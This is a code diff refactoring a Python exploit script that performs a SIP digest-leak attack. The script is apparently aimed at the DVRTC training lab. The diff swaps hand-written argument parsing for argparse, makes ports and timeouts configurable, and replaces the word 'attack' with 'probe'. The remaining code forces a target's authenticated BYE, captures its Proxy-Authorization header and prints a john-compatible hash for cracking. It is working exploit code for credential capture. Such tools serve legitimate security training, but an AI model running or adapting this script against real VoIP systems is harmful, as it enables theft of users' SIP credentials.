@@ -1,28 +1,7 @@
 #!/usr/bin/env python3
-"""
-Digest Leak Attack Demo Script
+"""Exploit the DVRTC digest leak path and print the captured SIP digest hash."""
 
-This script demonstrates the digest leak vulnerability where a SIP proxy
-forwards authentication challenges and responses between endpoints,
-allowing an attacker to capture credentials.
-
-Attack flow:
-1. Attacker sends INVITE to target extension (2000)
-2. Target auto-answers (200 OK)
-3. Attacker sends ACK
-4. Target hangs up (BYE)
-5. Attacker challenges BYE with 407 Proxy-Authentication-Required
-6. Proxy relays 407 to target
-7. Target responds with Proxy-Authorization containing credentials
-8. Proxy relays credentials to attacker = LEAK!
-
-Usage:
-    python digestleak.py [target_ip] [target_extension]
-
-Example:
-    python digestleak.py 127.0.0.1 2000
-"""
-
+import argparse
 import socket
 import random
 import hashlib
@@ -297,7 +276,7 @@ def same_call_id(response, call_id):
 def extract_credentials(proxy_auth_header, server_host, fallback_client_host):
     """Extract and display credentials from Proxy-Authorization header."""
     print("\n" + "="*60)
-    print("DIGEST LEAK SUCCESSFUL!")
+    print("DIGEST LEAK CAPTURED")
     print("="*60)
     print(f"\nCaptured Proxy-Authorization header:\n{proxy_auth_header}")
 
@@ -333,18 +312,27 @@ def extract_credentials(proxy_auth_header, server_host, fallback_client_host):
     return creds
 
 
-def run_attack(target_ip, target_ext, local_port=None):
-    """Run the digest leak attack."""
+def run_attack(
+    target_ip,
+    target_ext,
+    local_port=None,
+    *,
+    sip_port=5060,
+    invite_timeout=15.0,
+    bye_timeout=30.0,
+    auth_timeout=20.0,
+):
+    """Run the digest leak path and print the captured digest material."""
 
-    af, stype, proto, _, target_sockaddr = resolve_target(target_ip, 5060)
+    af, stype, proto, _, target_sockaddr = resolve_target(target_ip, sip_port)
     sock = socket.socket(af, stype, proto)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     if local_port is None:
         local_port = random.randint(20000, 40000)
     sock.bind(bind_address_for_family(af, local_port))
-    sock.settimeout(15)
+    sock.settimeout(invite_timeout)
 
-    local_ip = advertised_ip_for_target(target_ip, 5060)
+    local_ip = advertised_ip_for_target(target_ip, sip_port)
 
     call_id = generate_call_id()
     from_tag = generate_tag()
@@ -352,7 +340,7 @@ def run_attack(target_ip, target_ext, local_port=None):
     to_tag = None
     target_uri_host = format_uri_host(target_ip)
 
-    print(f"[*] Starting digest leak attack against {target_ext}@{target_uri_host}")
+    print(f"[*] Starting digest leak probe against {target_ext}@{target_uri_host}")
     print(f"[*] Local endpoint: {format_hostport(local_ip, local_port)}")
     print(f"[*] Call-ID: {call_id}")
 
@@ -431,7 +419,7 @@ Content-Length: 0\r
         # host -> VM), route the ACK via the proxy because Contact may point at
         # a VM-local 127.0.0.1 address that is not reachable from the attacker.
         ack_sockaddr = target_sockaddr
-        ack_destination = f"{target_uri_host}:5060"
+        ack_destination = f"{target_uri_host}:{sip_port}"
         target_is_loopback = False
         try:
             target_is_loopback = ipaddress.ip_address(normalize_host(target_ip)).is_loopback
@@ -442,7 +430,7 @@ Content-Length: 0\r
             contact_match = re.search(r'sip:[^@]+@(\[[^\]]+\]|[^:;>]+)(?::(\d+))?', contact_uri)
             if contact_match:
                 contact_host = normalize_host(contact_match.group(1))
-                contact_port = int(contact_match.group(2)) if contact_match.group(2) else 5060
+                contact_port = int(contact_match.group(2)) if contact_match.group(2) else sip_port
                 contact_is_loopback = False
                 try:
                     contact_is_loopback = ipaddress.ip_address(contact_host).is_loopback
@@ -469,7 +457,7 @@ Content-Length: 0\r
         bye_from_header = None
         bye_to_header = None
 
-        sock.settimeout(30)
+        sock.settimeout(bye_timeout)
         while not bye_received:
             try:
                 data, addr = sock.recvfrom(4096)
@@ -509,7 +497,7 @@ Content-Length: 0\r
 
         # Step 6: Wait for authenticated BYE (with credentials!)
         print(f"[6] Waiting for authenticated response (credentials)...")
-        sock.settimeout(20)
+        sock.settimeout(auth_timeout)
 
         credentials_received = False
         while not credentials_received:
@@ -561,35 +549,54 @@ Content-Length: 0\r
     return False
 
 
-def main():
-    target_ip = "127.0.0.1"
-    target_ext = "2000"
-    local_port = None
+def build_parser():
+    parser = argparse.ArgumentParser(
+        description="Exploit the digest leak path and print a john-compatible SIP hash"
+    )
+    parser.add_argument("host", nargs="?", default="127.0.0.1")
+    parser.add_argument("extension", nargs="?", default="2000")
+    parser.add_argument("--local-port", type=int)
+    parser.add_argument("--sip-port", type=int, default=5060)
+    parser.add_argument(
+        "--invite-timeout",
+        type=float,
+        default=15.0,
+        help="Seconds to wait for the initial INVITE transaction",
+    )
+    parser.add_argument(
+        "--bye-timeout",
+        type=float,
+        default=30.0,
+        help="Seconds to wait for the target BYE after the call is answered",
+    )
+    parser.add_argument(
+        "--auth-timeout",
+        type=float,
+        default=20.0,
+        help="Seconds to wait for the authenticated BYE after the 407 challenge",
+    )
+    return parser
 
-    if len(sys.argv) >= 2:
-        target_ip = sys.argv[1]
-    if len(sys.argv) >= 3:
-        target_ext = sys.argv[2]
-    if len(sys.argv) >= 4:
-        local_port = int(sys.argv[3])
 
-    print("""
-╔══════════════════════════════════════════════════════════════╗
-║              DIGEST LEAK ATTACK DEMONSTRATION                ║
-║                                                              ║
-║  This demonstrates CVE-style digest leak vulnerability       ║
-║  where SIP proxies forward authentication challenges         ║
-║  allowing credential capture.                                ║
-╚══════════════════════════════════════════════════════════════╝
-""")
+def main(argv=None):
+    parser = build_parser()
+    args = parser.parse_args(sys.argv[1:] if argv is None else argv)
 
-    success = run_attack(target_ip, target_ext, local_port=local_port)
+    success = run_attack(
+        args.host,
+        args.extension,
+        local_port=args.local_port,
+        sip_port=args.sip_port,
+        invite_timeout=args.invite_timeout,
+        bye_timeout=args.bye_timeout,
+        auth_timeout=args.auth_timeout,
+    )
 
     if success:
-        print("[+] Attack completed successfully!")
+        print("[+] Digest leak completed successfully")
         sys.exit(0)
     else:
-        print("[-] Attack failed")
+        print("[-] Digest leak failed")
         sys.exit(1)
 
 
